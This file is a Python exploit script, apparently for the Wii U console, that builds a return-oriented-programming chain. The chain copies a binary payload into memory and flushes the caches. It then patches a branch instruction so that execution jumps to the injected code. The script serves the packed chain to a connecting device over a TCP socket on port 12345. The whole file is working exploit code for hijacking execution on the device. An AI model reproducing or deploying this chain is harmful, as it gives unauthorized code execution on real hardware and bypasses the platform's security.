import socket, time, struct
from wiiu_rop_utils import *

rop = WiiU_ROP_Utils(1)

def doBL(dst, src):
	newval = (dst - src)
	newval &= 0x03FFFFFC
	newval |= 0x48000001
	return newval

def calc_addr(idx):
	return (0x4D120000 + (idx *4))

def _byteswap_long(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]

def GX2WaitForVsync():
	rop.tiny_call(ROP_GX2WaitForVsync)

# ROP CHAIN -------------------------------------------------------------------------------

f = open("build_files/payload0.bin", "rb")
fdata = f.read()
payload_size = len(fdata)
f.close()

payload_idx = 131
INSTALL_ADDR = 0x011DDF20

rop.memcpy(0xA0000000 + 0x21000000 + INSTALL_ADDR, calc_addr(payload_idx), payload_size)
rop.DCFlushRange(0xA0000000 + 0x21000000 + INSTALL_ADDR, payload_size)
rop.ICInvalidateRange(0xA0000000 + 0x21000000 + INSTALL_ADDR, payload_size)

rop.write32(0xA0000000 + 0x21000000 + 0x0101c56c, doBL(INSTALL_ADDR, 0x0101c56c))
rop.DCFlushRange(0xA0000000 + 0x21000000 + 0x0101c560, 0x40)
rop.ICInvalidateRange(0xA0000000 + 0x21000000 + 0x0101c560, 0x40)

rop.OSSendAppSwitchRequest(5, 0, 0)
rop.tiny_call(ROP_OSExitThread, 0)

# end of ROP CHAIN ------------------------------------------------------------------------



# placing our  data -----------------------------------------------------------------------

wowow = len(rop.rop_payload)

for i in range(payload_size//4):
	rop.rop_payload.append(struct.unpack(">I", fdata[i*4:(i*4) + 4])[0])

# done placing our data -------------------------------------------------------------------





for i in range(len(rop.rop_payload)):
	print("%3d: %08X" %(i,rop.rop_payload[i]))

print("")
print(hex(len(rop.rop_payload)*4))
print(wowow)

for i in range(2560 - len(rop.rop_payload)):
	if i >= 0:
		rop.append(0xF5A5A5A5)


rop_packet = struct.pack(">%iI" %len(rop.rop_payload), *rop.rop_payload)
print("")
input("Press ENTER to continue")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 12345))
s.listen(1)
conn = s.accept()
print('Connected by ', conn[1])
conn[0].send(rop_packet)